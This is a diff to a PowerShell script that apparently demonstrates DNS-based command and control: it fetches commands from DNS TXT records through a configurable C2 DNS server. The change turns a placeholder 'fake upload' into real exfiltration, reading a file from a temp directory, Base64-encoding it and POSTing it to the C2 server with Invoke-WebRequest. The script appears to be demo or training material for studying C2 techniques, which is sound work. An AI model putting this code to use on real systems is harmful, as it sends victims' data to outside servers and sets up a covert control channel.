@@ -7,7 +7,15 @@ Write-Host "Using DNS TXT-records from: $($dnsName)"
 Write-Host ""
 
 # DNS Lookup
-$dnsLookup = Resolve-DnsName $dnsName -Type TXT -Server "ns1.simply.com"
+
+
+if ($demoC2DnsServer) {
+    Write-Host "  DNS-Server: $($demoC2DnsServer)"
+    $dnsLookup = Resolve-DnsName $dnsName -Type TXT -Server $demoC2DnsServer
+} else {
+    $dnsLookup = Resolve-DnsName $dnsName -Type TXT
+}
+
 Write-Host "TXT Strings Found:"
 $dnsLookup.Strings | ForEach-Object {
     Write-Host "   $($_)"
@@ -83,11 +91,19 @@ foreach ($c2 in $c2Commands) {
                     $c2Server = $c2.Parameter
                 }
 
-        "https"  {
-                    Write-Host "Upload file to https C2 Server" -ForegroundColor Yellow
+        "http"  {
+                    Write-Host "Post information in file to Server" -ForegroundColor Yellow
                     Write-Host "    File: $(Join-Path $tempDir $c2.Parameter)"
-                    Write-Host "  Server: https://$($c2Server)"
-                    Write-Host "          ... well this is just a fake upload ;)" -ForegroundColor DarkGray
+                    Write-Host "  Server: http://$($c2Server)"
+
+                    $fileContent = (Get-Content (Join-Path $tempDir $c2.Parameter)).Trim()
+                    Write-Host " Content: $($fileContent)"
+                    
+                    [string]$encodedContent = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($fileContent))
+                    Write-Host "  Base64: $($encodedContent)"
+
+                    $webRequest = Invoke-WebRequest -Uri "http://$($c2Server)" -Method POST -Body $encodedContent
+                    Write-Host "  Status: HTTP $($webRequest.StatusCode) - $($webRequest.StatusDescription)"
                 }
 
         "DNS"  {
